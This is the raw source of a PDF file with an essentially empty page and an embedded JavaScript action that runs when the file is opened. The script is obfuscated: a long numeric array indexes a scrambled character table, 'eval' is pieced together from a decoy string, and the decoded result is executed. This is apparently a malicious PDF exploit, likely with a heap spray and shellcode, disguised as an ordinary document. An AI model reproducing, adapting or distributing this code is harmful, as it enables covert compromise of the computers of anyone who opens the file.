%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[0,
50,
63,
12,
69,
58,
35,
9,
26,
59,
37,
37,
35,
9,
20,
61,
25,
30,
35,
9,
26,
54,
20,
61,
35,
9,
72,
54,
25,
30,
35,
9,
25,
40,
59,
30,
35,
9,
59,
59,
54,
20,
35,
9,
37,
30,
61,
56,
35,
9,
30,
56,
26,
0,
35,
9,
26,
0,
59,
56,
35,
9,
56,
61,
30,
56,
35,
9,
72,
56,
26,
0,
35,
9,
54,
37,
62,
61,
35,
9,
72,
37,
26,
0,
35,
9,
59,
59,
56,
26,
35,
9,
37,
37,
44,
0,
35,
9,
54,
25,
26,
0,
35,
9,
56,
59,
59,
61,
35,
9,
59,
59,
72,
30,
35,
9,
26,
62,
57,
61,
35,
9,
62,
54,
25,
25,
35,
9,
20,
20,
62,
56,
35,
9,
0,
26,
20,
20,
35,
9,
30,
56,
26,
0,
35,
9,
61,
59,
59,
56,
35,
9,
59,
40,
30,
37,
35,
9,
72,
54,
56,
37,
35,
9,
26,
72,
20,
0,
35,
9,
57,
30,
59,
30,
35,
9,
25,
30,
26,
54,
35,
9,
54,
62,
72,
54,
35,
9,
25,
0,
25,
40,
35,
9,
54,
62,
30,
61,
35,
9,
26,
0,
54,
37,
35,
9,
59,
61,
72,
54,
35,
9,
72,
30,
26,
0,
35,
9,
72,
26,
59,
54,
35,
9,
20,
54,
56,
59,
35,
9,
26,
0,
54,
37,
35,
9,
57,
56,
72,
37,
35,
9,
20,
54,
56,
59,
35,
9,
61,
40,
59,
59,
35,
9,
30,
62,
30,
40,
35,
9,
8,
44,
20,
61,
35,
9,
61,
54,
56,
59,
35,
9,
44,
0,
59,
59,
35,
9,
0,
25,
56,
20,
35,
9,
59,
26,
62,
56,
35,
9,
72,
30,
20,
57,
35,
9,
61,
62,
56,
26,
35,
9,
56,
44,
61,
0,
35,
9,
44,
8,
56,
59,
35,
9,
25,
0,
30,
56,
35,
9,
59,
0,
20,
62,
35,
9,
72,
54,
62,
20,
35,
9,
54,
25,
25,
37,
35,
9,
54,
25,
26,
0,
35,
9,
56,
59,
57,
30,
35,
9,
37,
37,
44,
44,
35,
9,
56,
61,
26,
0,
35,
9,
26,
44,
30,
0,
35,
9,
25,
61,
30,
37,
35,
9,
54,
30,
20,
20,
35,
9,
56,
61,
57,
30,
35,
9,
44,
26,
26,
0,
35,
9,
44,
44,
56,
59,
35,
9,
56,
30,
26,
0,
35,
9,
56,
59,
26,
0,
35,
9,
8,
0,
61,
54,
35,
9,
54,
40,
54,
25,
35,
9,
25,
0,
61,
59,
35,
9,
8,
44,
54,
59,
35,
9,
37,
26,
26,
0,
35,
9,
26,
56,
57,
56,
35,
9,
56,
61,
72,
44,
35,
9,
72,
30,
59,
59,
35,
9,
40,
37,
56,
59,
35,
9,
20,
59,
25,
0,
35,
9,
37,
26,
26,
0,
35,
9,
26,
0,
56,
26,
35,
9,
37,
8,
20,
72,
35,
9,
54,
40,
56,
54,
35,
9,
40,
26,
25,
26,
35,
9,
20,
20,
20,
20,
35,
9,
25,
57,
20,
20,
35,
9,
25,
26,
20,
40,
35,
9,
56,
56,
56,
56,
35,
9,
56,
56,
56,
56,
35,
9,
54,
56,
54,
26,
35,
9,
30,
56,
37,
8,
35,
9,
20,
20,
37,
26,
35,
9,
56,
56,
56,
56,
35,
9,
54,
56,
56,
56,
35,
9,
61,
56,
26,
59,
35,
9,
54,
56,
62,
40,
35,
9,
26,
0,
54,
54,
35,
9,
26,
0,
25,
61,
35,
9,
62,
56,
54,
25,
35,
9,
61,
59,
26,
59,
35,
9,
20,
20,
56,
54,
35,
9,
37,
26,
25,
59,
35,
9,
37,
25,
37,
20,
35,
9,
56,
56,
56,
56,
35,
9,
72,
54,
37,
26,
35,
9,
37,
61,
72,
57,
35,
9,
54,
30,
37,
44,
35,
9,
62,
37,
20,
20,
35,
9,
61,
30,
26,
59,
35,
9,
26,
0,
56,
26,
35,
9,
25,
26,
25,
26,
35,
9,
20,
20,
37,
62,
35,
9,
20,
20,
20,
20,
35,
9,
56,
57,
25,
0,
35,
9,
72,
57,
25,
0,
35,
9,
25,
61,
26,
62,
35,
9,
56,
62,
56,
30,
35,
9,
56,
56,
56,
56,
35,
9,
54,
61,
26,
44,
35,
9,
56,
61,
57,
30,
35,
9,
56,
30,
61,
72,
35,
9,
72,
57,
57,
30,
35,
9,
37,
72,
37,
54,
35,
9,
61,
72,
72,
59,
35,
9,
57,
30,
30,
30,
35,
9,
72,
37,
56,
30,
35,
9,
59,
59,
72,
57,
35,
9,
61,
72,
59,
57,
35,
9,
57,
30,
30,
30,
35,
9,
57,
56,
56,
26,
35,
9,
72,
59,
57,
44,
35,
9,
54,
59,
57,
56,
35,
9,
20,
26,
37,
26,
35,
9,
56,
56,
56,
56,
35,
9,
20,
20,
56,
56,
35,
9,
56,
61,
54,
37,
35,
9,
25,
26,
26,
0,
35,
9,
61,
40,
59,
59,
35,
9,
61,
72,
54,
62,
35,
9,
62,
44,
30,
30,
35,
9,
72,
72,
56,
56,
35,
9,
37,
57,
72,
56,
35,
9,
61,
72,
72,
30,
35,
9,
62,
44,
30,
30,
35,
9,
57,
25,
56,
54,
35,
9,
37,
61,
37,
30,
35,
9,
61,
37,
37,
61,
35,
9,
62,
44,
30,
30,
35,
9,
56,
56,
56,
40,
35,
9,
26,
8,
54,
40,
35,
9,
56,
30,
61,
62,
35,
9,
26,
26,
59,
56,
35,
9,
62,
44,
30,
30,
35,
9,
30,
62,
56,
30,
35,
9,
37,
8,
54,
62,
35,
9,
37,
8,
56,
56,
35,
9,
54,
59,
56,
56,
35,
9,
37,
8,
54,
72,
35,
9,
20,
20,
56,
56,
35,
9,
62,
30,
54,
37,
35,
9,
61,
56,
26,
54,
35,
9,
62,
37,
72,
54,
35,
9,
56,
56,
37,
8,
35,
9,
20,
20,
54,
59,
35,
9,
56,
30,
54,
37,
35,
9,
56,
56,
37,
8,
35,
9,
25,
0,
26,
59,
35,
9,
54,
59,
56,
61,
35,
9,
54,
37,
20,
20,
35,
9,
26,
59,
56,
30,
35,
9,
56,
61,
61,
59,
35,
9,
56,
57,
25,
0,
35,
9,
62,
59,
25,
0,
35,
9,
26,
56,
30,
72,
35,
9,
56,
56,
59,
20,
35,
9,
20,
8,
72,
54,
35,
9,
26,
56,
30,
72,
35,
9,
56,
56,
59,
20,
35,
9,
61,
30,
72,
54,
35,
9,
56,
56,
37,
8,
35,
9,
20,
25,
37,
8,
35,
9,
54,
37,
20,
20,
35,
9,
25,
26,
56,
26,
35,
9,
20,
25,
40,
61,
35,
9,
20,
20,
20,
20,
35,
9,
30,
25,
26,
25,
35,
9,
25,
61,
56,
25,
35,
9,
20,
25,
40,
26,
35,
9,
56,
25,
26,
8,
35,
9,
37,
20,
26,
40,
35,
9,
0,
44,
56,
62,
35,
9,
61,
8,
59,
59,
35,
9,
54,
0,
26,
8,
35,
9,
61,
37,
62,
0,
35,
9,
72,
40,
30,
37,
35,
9,
62,
8,
59,
37,
35,
9,
72,
56,
57,
20,
35,
9,
72,
30,
37,
26,
35,
9,
72,
56,
72,
30,
35,
9,
57,
20,
59,
8,
35,
9,
59,
40,
57,
20,
35,
9,
57,
25,
59,
62,
35,
9,
59,
56,
59,
57,
35,
9,
57,
25,
59,
57,
35,
9,
59,
30,
59,
57,
35,
9,
57,
25,
59,
30,
35,
9,
59,
40,
59,
26,
35,
9,
37,
59,
57,
20,
35,
9,
72,
56,
57,
25,
35,
9,
72,
56,
37,
26,
35,
9,
37,
37,
59,
20,
35,
9,
59,
57,
59,
44,
35,
9,
59,
26,
59,
26,
35,
9,
37,
54,
57,
37,
35,
9,
59,
59,
59,
44,
35,
9,
56,
56,
56,
56,
58,
64,
20,
9,
4,
61,
34,
14,
67,
4,
66,
25,
19,
65,
43,
6,
43,
8,
15,
36,
32,
23,
52,
2,
47,
14,
1,
25,
6,
43,
8,
38,
1,
25,
4,
12,
34,
47,
18,
57,
60,
36,
32,
23,
52,
43,
8,
39,
69,
43,
8,
64,
29,
43,
8,
69,
43,
8,
38,
63,
9,
0,
63,
34,
43,
14,
4,
12,
6,
56,
15,
36,
32,
75,
57,
23,
64,
43,
25,
34,
9,
43,
4,
66,
43,
8,
64,
29,
66,
20,
9,
4,
61,
34,
14,
67,
4,
66,
0,
16,
6,
23,
52,
65,
8,
43,
66,
44,
22,
12,
69,
4,
25,
2,
66,
45,
43,
43,
8,
32,
6,
23,
64,
65,
8,
43,
66,
65,
2,
69,
56,
16,
56,
61,
56,
61,
56,
61,
56,
61,
64,
65,
8,
43,
66,
8,
44,
44,
43,
69,
56,
16,
30,
56,
56,
56,
56,
56,
64,
65,
8,
43,
66,
73,
8,
32,
1,
67,
8,
44,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
0,
50,
63,
12,
23,
64,
65,
8,
43,
66,
63,
61,
31,
1,
25,
4,
69,
73,
8,
32,
1,
67,
8,
44,
38,
1,
25,
4,
12,
34,
47,
18,
57,
64,
65,
8,
43,
66,
36,
32,
69,
8,
44,
44,
43,
24,
6,
63,
61,
31,
1,
25,
4,
39,
56,
16,
59,
26,
23,
64,
65,
8,
43,
66,
32,
8,
43,
63,
73,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
11,
35,
9,
40,
56,
40,
56,
35,
9,
40,
56,
40,
56,
11,
23,
64,
32,
8,
43,
63,
73,
69,
25,
19,
65,
43,
6,
32,
8,
43,
63,
73,
15,
36,
32,
23,
64,
65,
8,
43,
66,
61,
67,
9,
4,
34,
57,
69,
6,
65,
2,
24,
56,
16,
30,
56,
56,
56,
56,
56,
23,
75,
8,
44,
44,
43,
64,
20,
67,
43,
6,
65,
8,
43,
66,
61,
67,
9,
4,
34,
69,
56,
64,
61,
67,
9,
4,
34,
60,
61,
67,
9,
4,
34,
57,
64,
61,
67,
9,
4,
34,
39,
39,
23,
52,
44,
22,
12,
53,
61,
67,
9,
4,
34,
13,
69,
32,
8,
43,
63,
73,
39,
73,
8,
32,
1,
67,
8,
44,
64,
29,
66,
65,
8,
43,
66,
67,
65,
25,
43,
20,
1,
67,
2,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
11,
35,
9,
56,
61,
56,
61,
35,
9,
56,
61,
56,
61,
11,
23,
64,
2,
47,
14,
1,
25,
6,
67,
65,
25,
43,
20,
1,
67,
2,
38,
1,
25,
4,
12,
34,
47,
60,
30,
30,
40,
54,
57,
23,
52,
67,
65,
25,
43,
20,
1,
67,
2,
39,
69,
67,
65,
25,
43,
20,
1,
67,
2,
64,
29,
66,
34,
47,
14,
63,
38,
61,
67,
1,
1,
8,
0,
48,
34,
67,
43,
25,
69,
3,
67,
1,
1,
8,
0,
38,
61,
67,
1,
1,
25,
61,
34,
68,
74,
8,
14,
1,
46,
4,
20,
67,
6,
52,
63,
9,
0,
50,
42,
11,
11,
15,
74,
63,
12,
42,
67,
65,
25,
43,
20,
1,
67,
2,
29,
23,
64,
29,
66,
20,
9,
4,
61,
34,
14,
67,
4,
66,
73,
43,
14,
4,
34,
20,
6,
23,
52,
4,
67,
73,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
11,
35,
9,
56,
45,
56,
45,
35,
9,
56,
45,
56,
45,
35,
9,
56,
45,
56,
45,
35,
9,
56,
45,
56,
45,
11,
23,
64,
65,
8,
43,
66,
73,
8,
32,
1,
67,
8,
44,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
0,
50,
63,
12,
23,
64,
47,
25,
8,
73,
0,
1,
67,
61,
22,
69,
4,
67,
73,
39,
73,
8,
32,
1,
67,
8,
44,
64,
0,
14,
12,
0,
1,
67,
61,
22,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
11,
35,
9,
56,
45,
56,
45,
35,
9,
56,
45,
56,
45,
11,
23,
64,
47,
25,
8,
44,
25,
43,
63,
14,
19,
25,
69,
57,
56,
64,
63,
73,
43,
8,
32,
69,
47,
25,
8,
44,
25,
43,
63,
14,
19,
25,
39,
47,
25,
8,
73,
0,
1,
67,
61,
22,
38,
1,
25,
4,
12,
34,
47,
64,
2,
47,
14,
1,
25,
6,
0,
14,
12,
0,
1,
67,
61,
22,
38,
1,
25,
4,
12,
34,
47,
60,
63,
73,
43,
8,
32,
23,
52,
0,
14,
12,
0,
1,
67,
61,
22,
39,
69,
0,
14,
12,
0,
1,
67,
61,
22,
64,
29,
66,
20,
14,
1,
1,
0,
1,
67,
61,
22,
69,
0,
14,
12,
0,
1,
67,
61,
22,
38,
63,
9,
0,
63,
34,
43,
14,
4,
12,
6,
56,
15,
63,
73,
43,
8,
32,
23,
64,
0,
1,
67,
61,
22,
69,
0,
14,
12,
0,
1,
67,
61,
22,
38,
63,
9,
0,
63,
34,
43,
14,
4,
12,
6,
56,
15,
0,
14,
12,
0,
1,
67,
61,
22,
38,
1,
25,
4,
12,
34,
47,
24,
63,
73,
43,
8,
32,
23,
64,
2,
47,
14,
1,
25,
6,
0,
1,
67,
61,
22,
38,
1,
25,
4,
12,
34,
47,
39,
63,
73,
43,
8,
32,
60,
56,
16,
30,
56,
56,
56,
56,
23,
52,
0,
1,
67,
61,
22,
69,
0,
1,
67,
61,
22,
39,
0,
1,
67,
61,
22,
39,
20,
14,
1,
1,
0,
1,
67,
61,
22,
64,
29,
66,
74,
25,
74,
69,
4,
25,
2,
66,
45,
43,
43,
8,
32,
6,
23,
64,
20,
67,
43,
6,
14,
69,
56,
64,
14,
60,
62,
30,
56,
56,
64,
14,
39,
39,
23,
52,
74,
25,
74,
53,
14,
13,
69,
0,
1,
67,
61,
22,
39,
47,
25,
8,
73,
0,
1,
67,
61,
22,
64,
29,
66,
65,
8,
43,
66,
4,
9,
74,
69,
62,
57,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
26,
64,
9,
34,
14,
1,
38,
73,
43,
14,
4,
34,
20,
6,
11,
35,
30,
54,
56,
56,
56,
20,
11,
15,
4,
9,
74,
23,
64,
29,
66,
20,
9,
4,
61,
34,
14,
67,
4,
66,
12,
25,
34,
14,
61,
67,
4,
6,
23,
52,
65,
8,
43,
66,
8,
43,
43,
32,
69,
4,
25,
2,
66,
45,
43,
43,
8,
32,
6,
23,
64,
14,
20,
6,
8,
73,
73,
38,
44,
67,
61,
38,
3,
67,
1,
1,
8,
0,
38,
12,
25,
34,
46,
61,
67,
4,
23,
52,
65,
8,
43,
66,
73,
8,
32,
1,
67,
8,
44,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
0,
50,
63,
12,
23,
64,
65,
8,
43,
66,
47,
17,
36,
54,
56,
56,
3,
21,
69,
73,
8,
32,
1,
67,
8,
44,
38,
1,
25,
4,
12,
34,
47,
18,
57,
64,
65,
8,
43,
66,
36,
32,
69,
56,
16,
30,
56,
56,
56,
56,
56,
24,
6,
47,
17,
36,
54,
56,
56,
3,
21,
39,
56,
16,
59,
26,
23,
64,
65,
8,
43,
66,
32,
8,
43,
63,
73,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
11,
35,
9,
40,
56,
40,
56,
35,
9,
40,
56,
40,
56,
11,
23,
64,
32,
8,
43,
63,
73,
69,
25,
19,
65,
43,
6,
32,
8,
43,
63,
73,
15,
36,
32,
23,
64,
65,
8,
43,
66,
73,
54,
45,
50,
5,
37,
54,
20,
69,
6,
56,
16,
56,
61,
56,
61,
56,
61,
56,
61,
24,
56,
16,
30,
56,
56,
56,
56,
56,
23,
75,
56,
16,
30,
56,
56,
56,
56,
56,
64,
20,
67,
43,
6,
65,
8,
43,
66,
65,
36,
61,
10,
41,
40,
37,
32,
69,
56,
64,
65,
36,
61,
10,
41,
40,
37,
32,
60,
73,
54,
45,
50,
5,
37,
54,
20,
64,
65,
36,
61,
10,
41,
40,
37,
32,
39,
39,
23,
52,
8,
43,
43,
32,
53,
65,
36,
61,
10,
41,
40,
37,
32,
13,
69,
32,
8,
43,
63,
73,
39,
73,
8,
32,
1,
67,
8,
44,
64,
29,
66,
65,
8,
43,
66,
34,
49,
28,
47,
21,
0,
7,
2,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
11,
35,
56,
40,
11,
23,
64,
2,
47,
14,
1,
25,
6,
34,
49,
28,
47,
21,
0,
7,
2,
38,
1,
25,
4,
12,
34,
47,
60,
56,
16,
30,
56,
56,
56,
23,
52,
34,
49,
28,
47,
21,
0,
7,
2,
39,
69,
34,
49,
28,
47,
21,
0,
7,
2,
64,
29,
66,
34,
49,
28,
47,
21,
0,
7,
2,
69,
11,
21,
38,
11,
39,
34,
49,
28,
47,
21,
0,
7,
2,
64,
8,
73,
73,
38,
44,
67,
61,
38,
3,
67,
1,
1,
8,
0,
38,
12,
25,
34,
46,
61,
67,
4,
6,
34,
49,
28,
47,
21,
0,
7,
2,
23,
64,
29,
29,
66,
8,
27,
1,
9,
12,
14,
4,
63,
69,
8,
73,
73,
38,
73,
1,
9,
12,
46,
4,
63,
64,
65,
8,
43,
66,
63,
65,
69,
73,
8,
43,
63,
25,
46,
4,
34,
6,
8,
73,
73,
38,
65,
14,
25,
2,
25,
43,
51,
25,
43,
63,
14,
67,
4,
38,
34,
67,
48,
34,
43,
14,
4,
12,
6,
23,
38,
61,
47,
8,
43,
45,
34,
6,
56,
23,
23,
64,
20,
67,
43,
6,
65,
8,
43,
66,
14,
69,
56,
64,
14,
60,
8,
27,
1,
9,
12,
14,
4,
63,
38,
1,
25,
4,
12,
34,
47,
64,
14,
39,
39,
23,
52,
14,
20,
6,
8,
27,
1,
9,
12,
14,
4,
63,
53,
14,
13,
38,
4,
8,
74,
25,
69,
69,
58,
68,
48,
61,
43,
14,
73,
34,
58,
23,
52,
65,
8,
43,
66,
1,
65,
69,
8,
27,
1,
9,
12,
14,
4,
63,
53,
14,
13,
38,
65,
25,
43,
63,
14,
67,
4,
64,
29,
29,
66,
14,
20,
6,
6,
1,
65,
69,
69,
40,
23,
70,
70,
6,
6,
63,
65,
69,
69,
26,
23,
71,
71,
6,
1,
65,
60,
69,
26,
38,
62,
57,
23,
23,
23,
52,
12,
25,
34,
14,
61,
67,
4,
6,
23,
64,
29,
25,
1,
63,
25,
66,
14,
20,
6,
1,
65,
69,
69,
72,
38,
62,
23,
52,
73,
43,
14,
4,
34,
20,
6,
23,
64,
29,
25,
1,
63,
25,
66,
14,
20,
6,
6,
6,
63,
65,
69,
69,
37,
23,
70,
70,
6,
63,
65,
69,
69,
72,
23,
23,
71,
71,
6,
1,
65,
60,
72,
38,
62,
62,
23,
23,
52,
0,
16,
6,
23,
64,
29,
25,
1,
63,
25,
66,
14,
20,
6,
6,
1,
65,
33,
69,
40,
38,
62,
23,
70,
70,
6,
1,
65,
60,
69,
40,
38,
57,
23,
70,
70,
6,
1,
65,
33,
69,
26,
38,
62,
59,
23,
70,
70,
6,
1,
65,
60,
69,
26,
38,
62,
72,
23,
23,
52,
20,
9,
4,
61,
34,
14,
67,
4,
66,
8,
6,
23,
52,
9,
34,
14,
1,
38,
73,
43,
14,
4,
34,
44,
6,
58,
73,
55,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
62,
66,
42,
66,
32,
32,
32,
32,
62,
62,
62,
58,
15,
4,
25,
2,
66,
41,
8,
34,
25,
6,
23,
23,
64,
29,
65,
8,
43,
66,
47,
69,
8,
73,
73,
38,
73,
1,
9,
12,
46,
4,
63,
64,
20,
67,
43,
6,
65,
8,
43,
66,
20,
69,
56,
64,
20,
60,
47,
38,
1,
25,
4,
12,
34,
47,
64,
20,
39,
39,
23,
52,
14,
20,
6,
47,
53,
20,
13,
38,
4,
8,
74,
25,
69,
69,
58,
68,
48,
61,
43,
14,
73,
34,
58,
23,
52,
65,
8,
43,
66,
14,
69,
47,
53,
20,
13,
38,
65,
25,
43,
63,
14,
67,
4,
64,
29,
29,
66,
14,
20,
6,
6,
14,
33,
26,
38,
62,
57,
23,
71,
71,
6,
14,
60,
26,
38,
57,
23,
23,
52,
61,
69,
4,
25,
2,
66,
45,
43,
43,
8,
32,
6,
23,
64,
65,
8,
43,
66,
44,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
58,
35,
9,
40,
56,
40,
56,
35,
9,
40,
56,
40,
56,
58,
23,
64,
65,
8,
43,
66,
25,
69,
9,
4,
25,
63,
61,
8,
73,
25,
6,
0,
50,
63,
12,
23,
64,
2,
47,
14,
1,
25,
6,
44,
38,
1,
25,
4,
12,
34,
47,
60,
69,
56,
16,
26,
56,
56,
56,
23,
52,
44,
39,
69,
44,
64,
29,
44,
69,
44,
38,
63,
9,
0,
63,
34,
43,
6,
56,
15,
56,
16,
26,
56,
56,
56,
24,
25,
38,
1,
25,
4,
12,
34,
47,
23,
64,
20,
67,
43,
6,
20,
69,
56,
64,
20,
60,
57,
40,
56,
56,
64,
20,
39,
39,
23,
52,
61,
53,
20,
13,
69,
44,
39,
25,
64,
29,
8,
6,
23,
64,
8,
6,
23,
64,
34,
43,
32,
52,
34,
47,
14,
63,
38,
74,
25,
44,
14,
8,
38,
4,
25,
2,
27,
1,
8,
32,
25,
43,
6,
4,
9,
1,
1,
23,
64,
29,
61,
8,
34,
61,
47,
6,
25,
23,
52,
29,
8,
6,
23,
64,
29,
29];
cc={q:"blwCnK\(GauQ'g]i,xW*zfNk\)-e8PM}4_y>t%q6.+9D:rdAIhSUjV{[5@02'3<c1s;v oE=|&7pm/"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3848<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF